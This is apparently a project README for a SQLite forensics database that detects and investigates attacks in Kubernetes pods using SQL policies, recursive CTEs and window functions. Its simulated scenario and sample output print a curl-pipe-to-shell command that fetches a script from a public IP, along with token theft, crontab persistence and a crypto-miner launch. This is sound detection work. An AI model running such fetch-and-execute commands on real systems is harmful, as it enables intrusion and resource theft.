# Runtime-security forensics store (Q5)

This SQLite database takes in kernel-level events from Kubernetes pods (process exec/exit, file access, network connections). From them it rebuilds **process trees**, runs **detection policies written in SQL**, **dedupes alerts**, and answers an analyst's questions with recursive CTEs, window functions and full-text search.

The aim was to put the work *in the database*. The **schema enforces the invariants** and the **named SQL queries do the analysis**. Python (`forensics.py`) is only the thin ingestion path.

```bash
python simulate.py                    # normal traffic + one web-shell -> crypto-miner attack, then the investigation
python simulate.py --db f.db          # keep it; open with: sqlite3 f.db
python -m unittest test_forensics -v  # 11 tests, incl. 4 concurrent writer processes
```

## The scenario

A PHP app in `acme/payments-api` gets remote code execution. The attack runs `php-fpm → sh -c "curl … | sh" → curl`, then `sh x.sh`, which reads the service-account token, writes `/etc/crontab`, uses `wget` to fetch a miner, and runs `/tmp/.k`. The miner then connects to `45.33.12.9:3333` 40 times. It sits among about 550 events of normal traffic across two tenants and four pods, including health-check processes whose PIDs get reused.

## What the database does, and where

| Concern | Mechanism | File |
|---|---|---|
| PIDs are recycled | Identity is `(pod, pid, started_at)`. A **partial unique index** `ON processes(pod_id, pid) WHERE ended_at IS NULL` allows only one *live* holder of a pid and makes "who is pid 4242 now?" a single index lookup. | schema.sql |
| Detection | **One `INSERT … SELECT … ON CONFLICT DO UPDATE` statement** matches the event against every applicable policy. Rules are JSON (`exe_in`, `parent_exe_in`, `path_prefix`, `op_in`, `dst_port_in`) and are evaluated with `json_each` / `json_extract`. | queries.sql `match_policies` |
| Alert dedup | A **partial unique index** on `(tenant, fingerprint) WHERE status <> 'resolved'`. The upsert targets it, so a repeat bumps `hits`. After an alert is resolved, a recurrence opens a *new* alert. | schema.sql |
| No lost updates under concurrency | WAL journal mode, `BEGIN IMMEDIATE` per batch, and an atomic single-statement upsert. Tested with 4 processes × 50 single-event transactions → exactly 200 hits. | forensics.py, test |
| Evidence can't be edited | A `BEFORE UPDATE` trigger on `events` → `RAISE(ABORT)`. Deletes are allowed for retention only. | schema.sql |
| Alert workflow | A trigger-enforced state machine (open → acknowledged → resolved). A second trigger writes `alert_history` with the actor, so no code path can skip the audit trail. | schema.sql |
| "How did this process start?" | **Recursive CTE** from the child up to the root (with a cycle guard). | `ancestry` |
| "What did it do?" | Recursive CTE downward, aggregating each descendant's network and file activity. | `blast_radius` |
| Web-shell kill chain | Shell whose parent is an app server → any descendant connects to a non-private IP within 60 s. Two CTEs (one recursive) and a time-window join. | `kill_chain` |
| Bursts | `count(*) OVER (PARTITION BY pod ORDER BY ts RANGE BETWEEN 29 PRECEDING AND CURRENT ROW)` plus `LAG` for gaps. | `bursts` |
| Top-N per tenant | `ROW_NUMBER() OVER (PARTITION BY tenant ORDER BY severity, hits)` | `top_alerts` |
| IOC pivot ("who talked to this IP?") | An **expression + partial index** on `json_extract(detail,'$.dst_ip') WHERE kind='network'` | `who_contacted` |
| Free-text hunting | FTS5 kept in sync by triggers, BM25 ranking, `snippet()`, tenant-scoped. The tokenizer keeps IPs whole and splits paths. | `search` |
| Retention | Batched `DELETE … WHERE id IN (SELECT … LIMIT n)` keeps the write lock short. Cascades to FTS, and alert references become `NULL`. | `retention` |
| Indexes really used | Tests assert on `EXPLAIN QUERY PLAN` for the hot paths. | test_forensics.py |

## Investigation output (from `simulate.py`)

```
### Kill chain: app server -> shell -> outbound to public IP within 60s
  parent_exe  shell_cmd                               connecting_exe  dst              first_after_s  connections
  php-fpm     -c curl -s http://45.33.12.9/x.sh | sh  /usr/bin/curl   45.33.12.9:80    1              1
  php-fpm     -c curl -s http://45.33.12.9/x.sh | sh  /usr/bin/wget   45.33.12.9:80    4              1
  php-fpm     -c curl -s http://45.33.12.9/x.sh | sh  /tmp/.k         45.33.12.9:3333  8              40

### Ancestry of the miner process
  depth  pid   exe      args
  4      1     /pause
  3      7     php-fpm  --serve
  2      4242  /bin/sh  -c curl -s http://45.33.12.9/x.sh | sh
  1      4244  /bin/sh  x.sh
  0      4246  /tmp/.k  -o 45.33.12.9:3333 --threads 4
```

The full report is in `simulate_output.txt`.

## Why SQLite
It runs anywhere with zero setup, and its feature set covers everything shown here: CTEs, window functions, partial and expression indexes, triggers, JSON, FTS5, RETURNING and UPSERT. The same design carries over to Postgres almost line for line: `jsonb` + GIN index for the rules, `tsvector` for search, and partitioning events by time for retention.
